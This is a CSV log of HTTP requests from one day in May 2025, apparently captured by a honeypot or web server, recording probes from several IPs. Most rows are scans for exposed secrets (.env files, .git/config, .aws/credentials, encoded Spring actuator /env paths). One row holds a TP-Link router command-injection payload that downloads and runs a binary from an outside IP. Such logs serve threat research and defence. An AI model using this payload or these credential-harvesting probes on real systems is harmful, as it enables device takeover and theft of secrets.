"2025-05-17","134.209.58.98","United States","HTTP","/actuator;/en%76;"
"2025-05-17","134.209.58.98","United States","HTTP","/en%76;"
"2025-05-17","134.209.58.98","United States","HTTP","/api;/actuator;/en%76;"
"2025-05-17","134.209.58.98","United States","HTTP","/api;/en%76;"
"2025-05-17","134.209.58.98","United States","HTTP","/%61%70%69/%61%63%74%75%61%74%6f%72/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%61%70%69/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%61%70%69/%69%6e%74%65%72%6e%61%6c/%61%63%74%75%61%74%6f%72/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%67%61%74%65%77%61%79/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%67%61%74%65%77%61%79/%61%63%74%75%61%74%6f%72/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%6d%61%6e%61%67%65/%61%63%74%75%61%74%6f%72/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%6d%61%6e%61%67%65/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%6d%61%6e%61%67%65%6d%65%6e%74/%61%63%74%75%61%74%6f%72/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%6d%61%6e%61%67%65%6d%65%6e%74/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%61%63%74%75%61%74%6f%72/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%65%6e%76"
"2025-05-17","134.209.58.98","United States","HTTP","/%61%70%69/%61%63%74%75%61%74%6f%72/%65%6e%37%36"
"2025-05-17","134.209.58.98","United States","HTTP","/%61%70%69/%65%6e%37%36"
"2025-05-17","141.98.11.137","Lithuania","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F212.81.47.226%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)"
"2025-05-17","167.94.145.110","United States","HTTP","/favicon.ico"
"2025-05-17","167.94.145.110","United States","HTTP","/favicon.ico"
"2025-05-17","194.50.16.252","The Netherlands","HTTP","/.git/config"
"2025-05-17","194.50.16.252","The Netherlands","HTTP","/admin/.git/config"
"2025-05-17","194.50.16.252","The Netherlands","HTTP","/api/.git/config"
"2025-05-17","194.50.16.252","The Netherlands","HTTP","/login/.git/config"
"2025-05-17","194.50.16.252","The Netherlands","HTTP","/static../.git/config"
"2025-05-17","194.50.16.252","The Netherlands","HTTP","/config/.git/config"
"2025-05-17","194.50.16.252","The Netherlands","HTTP","/data/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.development.local"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.production"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.sandbox"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.template"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/assets../.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.prod"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.save"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/config/.env"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.test"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/api/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.ci"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.stage"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/project/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.local"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/prod/.env"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/app/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/data/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/server/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.aws/credentials"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.preprod"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/configuration/.env"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/core/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.secret"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.staging.local"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/files/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.default"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/src/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/dev/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.dev"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.live"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env_sample"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.backup"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/cms/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.dev.local"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.dist"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.uat"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/settings/.env"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/build/.env"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.bak"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.testing"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/media../.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/admin/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/media/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/docker-compose.prod.yml"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/public/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/config.json"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/config/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/.env.production.local"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/backup/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/static../.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/www/.git/config"
"2025-05-17","93.123.109.230","Bulgaria","HTTP","/api/.env"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/config.json"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.default"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.dev"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/build/.env"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.template"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/config/.git/config"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/dev/.git/config"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.dev.local"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/app/.git/config"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.preprod"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/configuration/.env"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/api/.env"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/prod/.env"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/data/.git/config"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.ci"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.config"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/config/.env"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.aws/credentials"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.testing"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/api/.git/config"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.development.local"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.secret"
"2025-05-17","93.123.109.231","Bulgaria","HTTP","/.env.staging.local"
